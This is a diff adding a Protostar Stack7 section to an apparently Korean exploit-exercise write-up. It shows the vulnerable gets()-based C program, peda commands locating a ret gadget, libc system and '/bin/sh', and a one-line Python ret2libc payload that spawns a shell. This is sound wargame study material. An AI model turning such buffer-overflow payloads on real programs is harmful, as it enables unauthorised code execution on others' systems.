@@ -434,3 +434,73 @@ id
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 
 ```
+
+### Stack7
+
+> /opt/protostar/bin/stack7
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+char *getpath()
+{
+  char buffer[64];
+  unsigned int ret;
+
+  printf("input path please: "); fflush(stdout);
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+
+  if((ret & 0xb0000000) == 0xb0000000) {
+      printf("bzzzt (%p)\n", ret);
+      _exit(1);
+  }
+
+  printf("got path %s\n", buffer);
+  return strdup(buffer);
+}
+
+int main(int argc, char **argv)
+{
+  getpath();
+
+}
+```
+
+알아야하는 것 : *peda*, *ROP*
+
+```
+gdb-peda$ ropgadget
+ret = 0x8048362   <== 선택
+popret = 0x8048493
+pop3ret = 0x80485c6
+pop2ret = 0x8048492
+pop4ret = 0x80485c5
+addesp_12 = 0x804848f
+addesp_44 = 0x80485c2
+```
+
+```
+gdb-peda$ print system
+$1 = {<text variable, no debug info>} 0xf7e4e310 <__libc_system>
+```
+
+```
+gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xf7f70bac ("/bin/sh")
+```
+
+```
+$ (python -c 'print "A"*80+"\x62\x83\x04\x08"+"\x10\xe3\xe4\xf7"+"AAAA"+"\xac\x0b\xf7\xf7"';cat)|./stack7
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb�AAAAAAAAAAAAb����AAAA�
+                                                                                                                     �
+id
+uid=1000(sparkling) gid=1000(sparkling) groups=1000(sparkling),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
+```
